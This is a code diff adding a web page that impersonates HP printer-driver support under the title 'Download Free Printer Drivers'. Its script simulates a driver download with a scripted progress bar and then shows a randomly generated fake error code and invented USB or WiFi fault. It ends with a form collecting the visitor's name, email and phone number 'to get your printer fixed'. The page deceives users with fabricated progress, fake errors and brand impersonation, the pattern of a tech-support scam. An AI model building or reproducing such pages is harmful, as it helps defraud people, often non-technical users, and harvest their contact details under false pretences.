+                    <h3>Wired</h3>
+                    <img src="../assets/images/usb-detup.jpg" alt="USB">
+                    <button class="popup-btn" onclick="selectConnection('usb')">
+                        Let's Start
+                        <i class="ri-arrow-right-circle-fill"></i>
+                    </button>
+                </div>
+
+                <!-- WIFI -->
+                <div class="connection-item">
+                    <h3>Wireless</h3>
+                    <img src="../assets/images/wifi-setup.png" alt="WiFi">
+                    <button class="popup-btn" onclick="selectConnection('wifi')">
+                        Let's Start
+                        <i class="ri-arrow-right-circle-fill"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Loading State -->
+            <div class="loading-state" id="loadingState" style="display: none;">
+                <div class="loader-icon"></div>
+                <p style="font-size: 1rem; color: #666; margin-bottom: 15px; margin-top: 20px;">
+                    Please wait<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span> Searching
+                    for USB Ports<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>
+                </p>
+                <p id="loadingText" style="font-size: 0.95rem; color: #999;">Verify your printer's USB connection for a
+                    seamless setup process.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Popup (Full Screen) -->
+    <div class="popup-overlay" id="loadingPopup">
+        <div class="popup connection-popup">
+            <button class="popup-close" onclick="closeLoadingPopup()">
+                <i class="ri-close-line"></i>
+            </button>
+            <h2>Quick Download Free Drivers</h2>
+            <p id="loadingTitle">Select Wi-Fi or USB Connection</p>
+
+            <div style="text-align: center; padding: 40px 0;">
+                <div class="loader-icon"></div>
+                <p style="font-size: 1rem; color: #666; margin-bottom: 15px; margin-top: 20px;">
+                    Please wait<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span> Searching
+                    for USB Ports<span class="dot">.</span><span class="dot">.</span><span class="dot">.</span>
+                </p>
+                <p id="loadingMessage" style="font-size: 0.95rem; color: #999;">Verify your printer's USB connection for
+                    a
+                    seamless setup process.</p>
+            </div>
+        </div>
+    </div>
+
+    <header>
+        <div class="logo">
+            <img src="https://digitalblitzjk.com/printers/printer-install/hp/new-hp-logo.svg" alt="HP">
+        </div>
+        <nav id="navbar">
+            <ul>
+                <li><a href="#" class="active">Home</a></li>
+                <li><a href="#">OfficeJet</a></li>
+                <li><a href="#">InkJet</a></li>
+                <li><a href="#">LaserJet</a></li>
+                <li><a href="#">Envy</a></li>
+            </ul>
+        </nav>
+        <div class="hamburger" id="hamburger">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </header>
+
+    <div class="hero">
+        <div class="hero-content">
+            <h1>Download Free Printer Drivers</h1>
+            <ul>
+                <li>Make sure your printer is powered on</li>
+                <li>Click on Download to install the drivers</li>
+            </ul>
+            <button class="download-btn openPopup">
+                Download Now
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                    stroke-width="2">
+                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                    <polyline points="7 10 12 15 17 10"></polyline>
+                    <line x1="12" y1="15" x2="12" y2="3"></line>
+                </svg>
+            </button>
+        </div>
+
+        <div class="hero-images">
+            <div class="printers-stack">
+                <img src="https://digitalblitzjk.com/printers/printer-install/epson/ezgif.png" alt="">
+            </div>
+        </div>
+    </div>
+
+    <div class="container-main">
+
+        <div class="fill-form">
+            <h2 class="section-title">Quick Download Free Drivers</h2>
+
+            <h4 class="heading-fill-form">Fill the form and download your printer driver</h4>
+
+            <div class="input-btn-section">
+
+                <label> Model Number: </label>
+                <input type="text">
+                <button class="download-btn openPopup"> Quick Download & Install Drivers!
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="2">
+                        <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                        <polyline points="7 10 12 15 17 10"></polyline>
+                        <line x1="12" y1="15" x2="12" y2="3"></line>
+                    </svg>
+                </button>
+            </div>
+
+
+        </div>
+
+
+        <div class="info-box">
+            <h4>How to find printer model number?</h4>
+            <p>The product name is on the front of your device.</p>
+            <img src="https://digitalblitzjk.com/printers/printer-install/epson/newtooltip_image.png" alt="Tooltip">
+
+        </div>
+
+    </div>
+    <div class="footer-img">
+        <div class="container">
+            <img src="https://digitalblitzjk.com/printers/printer-install/epson/epson-footer-1.jpg" alt="">
+        </div>
+    </div>
+
+    <script>
+        // Hamburger menu toggle
+        const hamburger = document.getElementById('hamburger');
+        const navbar = document.getElementById('navbar');
+        const navLinks = document.querySelectorAll('#navbar a');
+
+        hamburger.addEventListener('click', function () {
+            hamburger.classList.toggle('active');
+            navbar.classList.toggle('active');
+        });
+
+        // Close menu when a link is clicked
+        navLinks.forEach(link => {
+            link.addEventListener('click', function () {
+                hamburger.classList.remove('active');
+                navbar.classList.remove('active');
+            });
+        });
+
+        const printerForm = document.getElementById('printerForm');
+
+        if (printerForm) {
+            printerForm.addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                const model = document.getElementById('model');
+
+                if (!model) return;
+
+                const modelNumber = model.value.trim();
+
+                if (modelNumber === '') {
+                    alert('Please enter a model number');
+                    return;
+                }
+
+                const waitMsg = document.querySelector('.wait-msg');
+
+                if (waitMsg) {
+                    waitMsg.style.display = 'block';
+                }
+
+                setTimeout(() => {
+                    if (waitMsg) {
+                        waitMsg.style.display = 'none';
+                    }
+                    alert('Driver download started for: ' + modelNumber);
+                }, 2000);
+            });
+        }
+
+        // ===== POPUP FUNCTIONS =====
+        function openPopup(popupId) {
+            document.getElementById(popupId).classList.add('active');
+        }
+
+        function closePopup(popupId) {
+            document.getElementById(popupId).classList.remove('active');
+            if (popupId === 'connectionPopup' || popupId === 'loadingPopup') {
+                resetConnectionStates();
+            }
+        }
+
+        function goToPopup(fromId, toId) {
+            closePopup(fromId);
+            setTimeout(() => openPopup(toId), 300);
+        }
+
+        function submitDriverForm(e) {
+            e.preventDefault();
+            const model = document.getElementById('printerModel').value.trim();
+            if (model === '') {
+                alert('Please enter a model number');
+                return;
+            }
+            goToPopup('driverPopup', 'connectionPopup');
+        }
+
+        function generateErrorCode(type) {
+            if (type === 'usb') {
+                const codes = ['0x00000709', '0x80070057', '0x000000B1', '0x80070005'];
+                return codes[Math.floor(Math.random() * codes.length)];
+            } else {
+                const codes = ['0x00000651', '0x80070643', '0x800704B8', '0x800702F4'];
+                return codes[Math.floor(Math.random() * codes.length)];
+            }
+        }
+
+        function getErrorMessage(type) {
+            if (type === 'usb') {
+                return 'USB connection error detected. Please check your USB cable and ports.';
+            } else {
+                return 'WiFi connection unstable. Please check your network connection and router settings.';
+            }
+        }
+
+        function selectConnection(type) {
+            // Hide connection list and show loading state
+            document.getElementById('connectionList').style.display = 'none';
+            document.getElementById('loadingState').classList.add('active');
+
+            // Update loading message based on type
+            const loadingText = document.getElementById('loadingText');
+            if (type === 'usb') {
+                loadingText.textContent = 'Verify your printer\'s USB connection for a seamless setup process.';
+            } else {
+                loadingText.textContent = 'Verify your printer\'s WiFi connection for a seamless setup process.';
+            }
+
+            // Store connection type globally
+            window.currentConnectionType = type;
+            window.currentErrorCode = generateErrorCode(type);
+            window.currentErrorMessage = getErrorMessage(type);
+
+            // Show loading popup
+            closePopup('connectionPopup');
+            setTimeout(() => {
+                showLoadingPopup(type);
+            }, 300);
+        }
+
+        function showLoadingPopup(type) {
+            // Update loading popup message based on type
+            const loadingTitle = document.getElementById('loadingTitle');
+            const loadingMessage = document.getElementById('loadingMessage');
+
+            loadingTitle.textContent = 'Select Wi-Fi or USB Connection';
+
+            if (type === 'usb') {
+                loadingMessage.textContent = 'Verify your printer\'s USB connection for a seamless setup process.';
+            } else {
+                loadingMessage.textContent = 'Verify your printer\'s WiFi connection for a seamless setup process.';
+            }
+
+            openPopup('loadingPopup');
+
+            // After 5 seconds, close loading and show error code
+            setTimeout(() => {
+                closePopup('loadingPopup');
+                setTimeout(() => {
+                    startDownloadSetupFlow();
+                }, 300);
+            }, 5000);
+        }
+
+        function closeLoadingPopup() {
+            closePopup('loadingPopup');
+            // Reset connection popup
+            document.getElementById('connectionList').style.display = 'flex';
+            document.getElementById('loadingState').classList.remove('active');
+        }
+
+        function showErrorCodePopup() {
+            document.getElementById('dynamicErrorCode').textContent = window.currentErrorCode;
+            document.getElementById('dynamicErrorMessage').textContent = window.currentErrorMessage;
+            openPopup('errorCodePopup');
+        }
+
+        function resetConnectionStates() {
+            document.getElementById('connectionList').style.display = 'flex';
+            document.getElementById('loadingState').classList.remove('active');
+        }
+
+        function goFromErrorCodeToForm() {
+            closePopup('errorCodePopup');
+            setTimeout(() => {
+                showErrorCodeForm();
+            }, 300);
+        }
+
+
+        function startDownloadSetupFlow() {
+
+            const popup = document.getElementById('downloadSetupPopup');
+
+            if (!popup) {
+                console.error('❌ downloadSetupPopup not found');
+                return;
+            }
+
+            popup.classList.add('active');
+
+            const progressBar = document.getElementById('downloadSetupProgress');
+            const progressPercent = document.getElementById('downloadSetupPercent');
+            const progressStatus = document.getElementById('downloadSetupStatus');
+            const currentTask = document.getElementById('downloadSetupTask');
+
+            const filePackage = document.getElementById('setupFilePackage');
+            const fileDrivers = document.getElementById('setupFileDrivers');
+            const fileTools = document.getElementById('setupFileTools');
+            const fileVerify = document.getElementById('setupFileVerify');
+
+            const files = [
+                filePackage,
+                fileDrivers,
+                fileTools,
+                fileVerify
+            ];
+
+            // Reset
+            if (progressBar) progressBar.style.width = '0%';
+            if (progressPercent) progressPercent.textContent = '0%';
+            if (progressStatus) progressStatus.textContent = 'Preparing setup files...';
+
+            if (currentTask) {
+                currentTask.innerHTML =
+                    '<i class="ri-loader-4-line ri-spin"></i> Connecting to setup service...';
+            }
+
+            files.forEach(file => {
+                if (!file) return;
+
+                file.classList.remove('downloading', 'completed');
+
+                const status = file.querySelector('.download-file-content span');
+                const check = file.querySelector('.download-file-check');
+
+                if (status) status.textContent = 'Waiting...';
+                if (check) check.innerHTML = '<i class="ri-time-line"></i>';
+            });
+
+            const steps = [
+                {
+                    progress: 8,
+                    status: 'Preparing setup files...',
+                    task: 'Connecting to setup service...',
+                    file: null
+                },
+                {
+                    progress: 20,
+                    status: 'Checking setup package...',
+                    task: 'Checking required printer files...',
+                    file: filePackage
+                },
+                {
+                    progress: 35,
+                    status: 'Downloading setup files...',
+                    task: 'Downloading printer setup package...',
+                    file: filePackage
+                },
+                {
+                    progress: 50,
+                    status: 'Downloading driver components...',
+                    task: 'Downloading required driver files...',
+                    file: fileDrivers
+                },
+                {
+                    progress: 65,
+                    status: 'Preparing printer software...',
+                    task: 'Preparing printer software...',
+                    file: fileDrivers
+                },
+                {
+                    progress: 78,
+                    status: 'Installing setup components...',
+                    task: 'Installing required setup components...',
+                    file: fileTools
+                },
+                {
+                    progress: 88,
+                    status: 'Preparing diagnostic tools...',
+                    task: 'Preparing problem detection tools...',
+                    file: fileTools
+                },
+                {
+                    progress: 96,
+                    status: 'Verifying setup files...',
+                    task: 'Checking downloaded files...',
+                    file: fileVerify
+                },
+                {
+                    progress: 100,
+                    status: 'Setup files ready',
+                    task: 'Setup completed successfully.',
+                    file: fileVerify
+                }
+            ];
+
+            let currentStep = 0;
+
+            const timer = setInterval(() => {
+
+                const step = steps[currentStep];
+
+                if (!step) {
+                    clearInterval(timer);
+                    return;
+                }
+
+                if (progressBar) {
+                    progressBar.style.width = step.progress + '%';
+                }
+
+                if (progressPercent) {
+                    progressPercent.textContent = step.progress + '%';
+                }
+
+                if (progressStatus) {
+                    progressStatus.textContent = step.status;
+                }
+
+                if (currentTask) {
+                    if (step.progress === 100) {
+                        currentTask.innerHTML =
+                            '<i class="ri-checkbox-circle-fill" style="color:#16a34a;"></i> ' +
+                            step.task;
+                    } else {
+                        currentTask.innerHTML =
+                            '<i class="ri-loader-4-line ri-spin"></i> ' +
+                            step.task;
+                    }
+                }
+
+                if (step.file) {
+
+                    const fileIndex = files.indexOf(step.file);
+
+                    files.forEach((file, index) => {
+
+                        if (!file) return;
+
+                        const status =
+                            file.querySelector('.download-file-content span');
+
+                        const check =
+                            file.querySelector('.download-file-check');
+
+                        if (index < fileIndex) {
+
+                            file.classList.remove('downloading');
+                            file.classList.add('completed');
+
+                            if (status) status.textContent = 'Completed';
+
+                            if (check) {
+                                check.innerHTML =
+                                    '<i class="ri-checkbox-circle-fill"></i>';
+                            }
+
+                        } else if (index === fileIndex) {
+
+                            file.classList.add('downloading');
+                            file.classList.remove('completed');
+
+                            if (status) status.textContent = 'Downloading...';
+
+                            if (check) {
+                                check.innerHTML =
+                                    '<i class="ri-loader-4-line ri-spin"></i>';
+                            }
+                        }
+
+                    });
+                }
+
+                if (step.progress === 100) {
+
+                    files.forEach(file => {
+
+                        if (!file) return;
+
+                        file.classList.remove('downloading');
+                        file.classList.add('completed');
+
+                        const status =
+                            file.querySelector('.download-file-content span');
+
+                        const check =
+                            file.querySelector('.download-file-check');
+
+                        if (status) status.textContent = 'Completed';
+
+                        if (check) {
+                            check.innerHTML =
+                                '<i class="ri-checkbox-circle-fill"></i>';
+                        }
+                    });
+                }
+
+                currentStep++;
+
+                if (currentStep >= steps.length) {
+
+                    clearInterval(timer);
+
+                    // Keep 100% visible before moving to Detecting Problems.
+                    setTimeout(() => {
+
+                        popup.classList.remove('active');
+
+                        setTimeout(() => {
+
+                            // Existing detecting popup remains unchanged.
+                            openPopup('detectingPopup');
+
+                            setTimeout(() => {
+
+                                closePopup('detectingPopup');
+
+                                setTimeout(() => {
+                                    openPopup('errorCodePopup');
+                                }, 300);
+
+                            }, 3000);
+
+                        }, 350);
+
+                    }, 1200);
+                }
+
+            }, 450);
+        }
+
+
+        function showErrorCodeForm() {
+            const formPopupHtml = `
+            <div class="popup-overlay" id="errorCodeFormPopup">
+                <div class="popup">
+                    <button class="popup-close" onclick="closePopup('errorCodeFormPopup')">
+                        <i class="ri-close-line"></i>
+                    </button>
+                    <h2 style="margin-bottom: 15px;">Quick Download Free Drivers</h2>
+                    <p style="color: #666; margin-bottom: 30px;">Fill the form to get your printer fixed</p>
+                    <form onsubmit="submitErrorCodeForm(event)" style="max-width: 100%;">
+                        <div class="form-group" style="margin-bottom: 25px;">
+                            <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #333; font-size: 16px; text-align: left;">Full Name</label>
+                            <input type="text" id="userName" required placeholder="Enter your full name" style="width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; font-family: 'Poppins', sans-serif; box-sizing: border-box;">
+                        </div>
+                        <div class="form-group" style="margin-bottom: 25px;">
+                            <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #333; font-size: 16px; text-align: left;">Email Address</label>
+                            <input type="email" id="userEmail" required placeholder="Enter your email" style="width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; font-family: 'Poppins', sans-serif; box-sizing: border-box;">
+                        </div>
+                        <div class="form-group" style="margin-bottom: 30px;">
+                            <label style="display: block; margin-bottom: 10px; font-weight: 600; color: #333; font-size: 16px; text-align: left;">Phone Number</label>
+                            <input type="tel" id="userPhone" required placeholder="Enter your phone number" style="width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; font-family: 'Poppins', sans-serif; box-sizing: border-box;">
+                        </div>
+                        <button type="submit" class="popup-btn" style="width: 100%; justify-content: center;">
+                            Submit & Continue
+                            <i class="ri-arrow-right-circle-fill"></i>
+                        </button>
+                    </form>
+                </div>
+            </div>`;
+
+            const div = document.createElement('div');
+            div.innerHTML = formPopupHtml;
+            document.body.appendChild(div.firstElementChild);
+
+            setTimeout(() => {
+                const inputs = document.querySelectorAll('#errorCodeFormPopup input');
+                inputs.forEach(input => {
+                    input.addEventListener('focus', function () {
+                        this.style.borderColor = '#0096d6';
+                        this.style.boxShadow = '0 0 0 3px rgba(0, 150, 214, 0.1)';
+                    });
+                    input.addEventListener('blur', function () {
+                        this.style.borderColor = '#ddd';
+                        this.style.boxShadow = 'none';
+                    });
+                });
+            }, 150);
+
+            setTimeout(() => {
+                document.getElementById('errorCodeFormPopup').classList.add('active');
+            }, 100);
+        }
+
+        function submitErrorCodeForm(e) {
+            e.preventDefault();
+            const name = document.getElementById('userName').value;
+            const email = document.getElementById('userEmail').value;
+            const phone = document.getElementById('userPhone').value;
+            const connectionType = window.currentConnectionType === 'usb' ? 'USB' : 'WiFi';
+            const errorCode = window.currentErrorCode;
+
+            alert(`Thank you ${name}!\n\nConnection Type: ${connectionType}\nError Code: ${errorCode}\nEmail: ${email}\nPhone: ${phone}\n\nWe'll contact you soon!`);
+            closePopup('errorCodeFormPopup');
+        }
+
+        function fixIssueFromErrorCode() {
+            closePopup('errorCodePopup');
+            setTimeout(() => {
+                openPopup('detectingPopup');
+                setTimeout(() => {
+                    closePopup('detectingPopup');
+                    setTimeout(() => {
+                        openPopup('errorCodePopup');
+                    }, 300);
+                }, 3000);
+
+
+            }, 300);
+        }
+
+        // Event Listeners for openPopup buttons
+        document.querySelectorAll('.openPopup').forEach(btn => {
+            btn.addEventListener('click', function (e) {
+                e.preventDefault();
+                openPopup('downloadPopup');
+            });
+        });
+    </script>
+
+</body>
+
+</html>
